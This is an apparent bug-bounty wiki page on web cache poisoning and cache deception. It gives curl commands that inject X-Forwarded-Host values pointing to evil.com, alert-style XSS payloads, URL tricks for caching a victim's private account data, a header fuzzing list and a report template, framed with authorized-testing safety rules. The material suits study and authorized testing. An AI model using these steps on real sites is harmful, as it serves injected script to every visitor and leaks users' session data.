---
type: wiki
category: attack
tool: burp,param-miner
status: active
last-updated: 2026-04-21
---

# Web Cache Poisoning & Deception

> **Purpose:** CDN / Varnish / nginx caches exist on almost every site. If the cache key omits some header/param, an attacker can poison the cache so that every user of the site receives a malicious response.
> This became a top-bounty category after James Kettle's 2018 research. Scenarios where reflected XSS can't fire can turn into stored XSS via the cache -> P2-P1.

## 0. Two categories

| | Cache Poisoning | Cache Deception |
|--|---|---|
| Direction | Attacker writes into the cache, harming others | Victim's own private response gets stored into the public cache |
| Impact | Stored XSS / redirect / DoS | Session leak (PII / token) |
| Key technique | Unkeyed header affects the response | URL path confusion tricks the cache rule |

## 1. Cache Poisoning principle

```
Request 1 (attacker):
  GET /index.html
  Host: target.com
  X-Forwarded-Host: evil.com   <- unkeyed (not counted in the cache key)
  ↓
  Server response: <meta ... href="https://evil.com/...">
  ↓
  Cache saves this response under key "GET /index.html + Host: target.com"

Request 2 (victim):
  GET /index.html
  Host: target.com
  ↓
  Cache hit -> gets the attacker's poisoned response
  ↓
  Victim browser loads evil.com/x
```

### Cache key and unkeyed input

The cache only uses **part** of the request as the key (usually method + path + Host). If an **input not in the key** affects the response, it can be used to poison the cache.

Common unkeyed inputs:
- `X-Forwarded-Host / X-Host / X-Forwarded-Scheme`
- `X-Forwarded-For / X-Real-IP`
- `User-Agent` — some hashing schemes only use part of it
- `X-HTTP-Method-Override`
- Port in Host (`Host: target.com:80` vs `target.com`)
- Case sensitivity (`Host: TARGET.com`)
- Trailing whitespace
- Query string parameter order / duplication
- Cookie (usually keyed, but a subset may not be)
- Custom headers: `X-Original-URL`, `X-Rewrite-URL`

## 2. Detection: Param Miner (Burp)

```
1. Burp BApp Store -> install "Param Miner"
2. Right-click the request -> "Guess headers" (large-dictionary header fuzzing)
3. Param Miner will:
   - Detect cache hit/miss differences
   - Fuzz 1000+ unkeyed headers
   - Find the payload reflected in the response
4. Check the Issues tab -> "Cache poisoning"
```

Param Miner is the **decisive tool** for this category — manual testing almost never finds these.

## 3. Manual detection workflow

### Step 1: Confirm a cache exists

```bash
curl -sk -I https://target.com/index.html
# Look at headers:
# X-Cache: HIT / MISS
# Age: 123
# CF-Cache-Status: HIT
# X-Served-By: cache-xxx
# Via: varnish
```

### Step 2: Test X-Forwarded-Host

```bash
# Bust the cache (change the path once)
curl -sk "https://target.com/index.html?cb=$(date +%s)" -H "X-Forwarded-Host: evil.com"

# Hit the same URL again to see if it reflects
curl -sk "https://target.com/index.html?cb=$(date +%s)" | grep evil.com

# If the response contains <script src="https://evil.com/..."> -> confirmed
```

### Step 3: Confirm it actually got cached

```bash
# Hit the same cache-buster URL a second time
curl -sk "https://target.com/index.html?cb=123" | grep evil.com
# The first hit doesn't need X-Forwarded-Host — check whether it still reflects
# If it does -> poisoned, it made it into the cache
```

## 4. Common gadget types

### 4.1 Reflected header in HTML

```html
<!-- HTML has: -->
<link rel="canonical" href="https://<Host>/path"/>

<!-- Attacker sends: -->
Host: target.com
X-Forwarded-Host: <script>alert(1)</script>

<!-- If X-Forwarded-Host replaces the canonical value -> stored XSS after caching -->
```

### 4.2 Import asset URL

```javascript
// Application code:
const apiBase = req.headers['x-forwarded-host'] || 'api.target.com';
// response includes
<script src="//x-forwarded-host/main.js"></script>
```

Attacker poisons the cache -> victim loads `evil.com/main.js`.

### 4.3 Redirect to attacker

```http
# Response
HTTP/1.1 302 Found
Location: https://<X-Forwarded-Host>/home
```

Victim is permanently redirected to evil.com.

### 4.4 Port in Host

```
Host: target.com:<script>alert(1)</script>
```

Some apps reflect `$HTTP_HOST` into HTML -> XSS after caching.

### 4.5 DoS class (low value, but worth recording)

```
GET /index.html
X-Oops: xxx<huge payload>

Server returns a 400 error page
Cache stores the 400 page under the ordinary /index.html key
-> the whole site's /index.html serves victims a 400
```

Most programs don't accept DoS-class findings.

## 5. Cache Deception

### 5.1 Principle

Cache rules commonly say "cache anything with a static extension (css/js/png/gif/ico), regardless of cookies." Attackers make a URL look static:

```
Victim clicks a link:
https://target.com/profile/me/nonexistent.css

Server returns the /profile/me response (because of nginx try_files or framework routing)
-> the response contains the victim's private data (email, session, etc.)
-> the cache sees the URL ends in .css -> caches it
-> anyone visiting the same URL gets the victim's private data
```

### 5.2 Implementation

```bash
# Attacker gets the victim to open
https://target.com/my-account/x.css

# Server resolves: /my-account is a valid route, ignores /x.css
# Response: {"email":"victim@x.com","credit_card":"4111...","token":"..."}

# Cache header sees .css -> cached

# Attacker opens:
curl https://target.com/my-account/x.css
-> gets the victim's response
```

### 5.3 Bypass patterns

```
/my-account/x.css
/my-account/x.jpg
/my-account/x.ico
/my-account/x%2F.css
/my-account/.css
/my-account?x=1.css
/my-account/..%2F..%2Fstatic%2Fx.css
/my-account;x.css          <- matrix param
```

Omer Gil's original research tested 20+ variants; Cloudflare / CloudFront / Akamai / Fastly were all found vulnerable.

## 6. Keyed / unkeyed testing technique

```bash
# Goal: confirm whether a given header is part of the cache key

# Two requests differing by only one header

A:
  GET /path?cb=1  Host: target.com
B:
  GET /path?cb=1  Host: target.com  X-Header: test

If:
- Both A and B MISS the first time, both HIT the second time -> X-Header is in the key (or has no effect at all)
- A HITs, B MISSes -> X-Header might not be in the key, but A was already cached
- Both MISS, bodies differ -> unkeyed + reflected [OK] -> can poison

# Param Miner automates this workflow
```

## 7. Real-world PoC: Header Reflection -> Stored XSS via Cache

Target: assume the homepage reflects `<meta property="og:url" content="https://<Host>/">`.

### Step 1: Confirm Host reflection
```bash
curl -sk https://target.com/ -H "Host: XSS.com" | grep "og:url"
# <meta property="og:url" content="https://XSS.com/">
```

### Step 2: Find an unkeyed header that can override Host
```bash
# X-Forwarded-Host:
curl -sk https://target.com/ -H "X-Forwarded-Host: evil.com" | grep "og:url"
# -> <meta property="og:url" content="https://evil.com/">
```

### Step 3: Confirm the cache picked it up
```bash
CB=$(date +%s)
# First request with the payload (write)
curl -sk "https://target.com/?cb=$CB" \
  -H "X-Forwarded-Host: x.evil.com/\"><script>alert(1)</script><x y=\""

# Second, clean request (read)
curl -sk "https://target.com/?cb=$CB" | grep script
# If you see <script>alert(1)</script> -> poisoning succeeded
```

### Step 4: Find a DoS-safe path to experiment on
- [NO] Don't poison `/` or `/js/app.js` (that would harm everyone)
- [OK] Use a custom `?cb=uuid` or an uncommon path

### Step 5: Report + request a cache purge

## 8. Real-world PoC: Cache Deception -> Session Steal

Target: a React SPA, `/account` returns PII as JSON

### Step 1: Check the cache rules
```bash
curl -sk -I https://target.com/static/app.js
# -> Cache-Control: public, max-age=3600
curl -sk -I https://target.com/account -H "Authorization: Bearer $TOKEN"
# -> Cache-Control: no-store (normal)

# Test deception
curl -sk https://target.com/account/x.css -H "Authorization: Bearer $TOKEN"
# If it returns the /account response -> even though Cache-Control may still say no-store,
# the CDN sometimes ignores that (it just looks at the extension and caches it)
```

### Step 2: Confirm the cache hit (from another session)
```bash
curl -sk https://target.com/account/x.css    # no auth
# If it returns your JSON data -> success -> P1 session leak
```

## 9. Safety testing rules

1. [WARNING] **Cache poisoning is globally stored** — every visitor sees it
2. [OK] Use `?cb=random-uuid` to isolate your test cache entries
3. [NO] Don't poison the index, main.js, or other core assets
4. [NO] Don't poison high-traffic pages
5. [OK] Contact the program immediately after testing -> cache purge
6. [OK] Include the poisoned URL and a cache-purge recommendation in the report
7. [WARNING] Most programs consider DoS-only poisoning out of scope

## 10. Report template

```markdown
## Vulnerability Summary
The Cloudflare cache on https://target.com/ does not include `X-Forwarded-Host` in the
cache key. This header is reflected unescaped into `<meta property="og:url">`, allowing
an attacker to poison the cache so that all subsequent visitors to this URL execute
arbitrary JavaScript (stored XSS).

## Steps to Reproduce

### Step 1: Confirm reflection
curl -sk "https://target.com/?cb=$(date +%s)" \
  -H "X-Forwarded-Host: poc.example.com" | grep og:url
-> <meta property="og:url" content="https://poc.example.com/"/>

### Step 2: Inject the payload
CB=rpoc-2026-04-21
curl -sk "https://target.com/?cb=$CB" \
  -H 'X-Forwarded-Host: x"><script>alert(document.domain)</script><x y="'

### Step 3: Verify cache persistence
curl -sk "https://target.com/?cb=$CB" | grep alert
-> <meta property="og:url" content="https://x"><script>alert(document.domain)</script>

### Step 4: Visit the same URL from another IP / browser
-> browser fires the alert (same origin)

## Impact
- Stored XSS (JavaScript executes for any visitor to the poisoned URL)
- Can steal an authenticated user's cookie / localStorage
- Because the Cloudflare TTL is 3600s, the poisoning can persist for up to 1 hour

## Remediation
1. Make Cache-Control exclude the effect of X-Forwarded-Host, or
2. Add X-Forwarded-Host to the Vary header / cache key, or
3. Most fundamentally: HTML-escape og:url server-side

## Cache purge (urgent)
Please purge the URL `https://target.com/?cb=rpoc-2026-04-21` immediately.

## Severity
P1 / Critical
```

## 11. Nuclei template

```yaml
id: cache-poisoning-xfh
info:
  name: X-Forwarded-Host Cache Poisoning probe
  severity: info

http:
  - raw:
      - |
        GET /?{{randstr}} HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Host: {{interactsh-url}}

    matchers:
      - type: dsl
        dsl:
          - contains(body, "{{interactsh-url}}")
```

In practice nuclei isn't great at testing cache poisoning — you need to diff the response of a second request. Manual testing / Param Miner is the most reliable approach.

## 12. Common header fuzzing list

```
X-Forwarded-Host
X-Forwarded-Server
X-Forwarded-Scheme
X-Forwarded-Proto
X-Forwarded-For
X-Forwarded-Port
X-Host
X-Real-IP
X-Original-URL
X-Rewrite-URL
X-Override-URL
X-HTTP-Method-Override
X-HTTP-Host-Override
X-Backend
X-Original-Host
Forwarded
True-Client-IP
CF-Connecting-IP
Fastly-Client-IP
Via
Referer
User-Agent
Accept-Language
Accept-Encoding
Pragma
```

## Related documents

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — attacking behind a CDN
- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) — header bypass techniques
- [60-request-smuggling.md](60-request-smuggling.md) — common impact of smuggling
- PortSwigger Cache Poisoning Research: https://portswigger.net/research/practical-web-cache-poisoning
- PortSwigger Cache Deception Lab: https://portswigger.net/web-security/web-cache-deception
- Omer Gil's original paper: https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- Param Miner: https://github.com/PortSwigger/param-miner
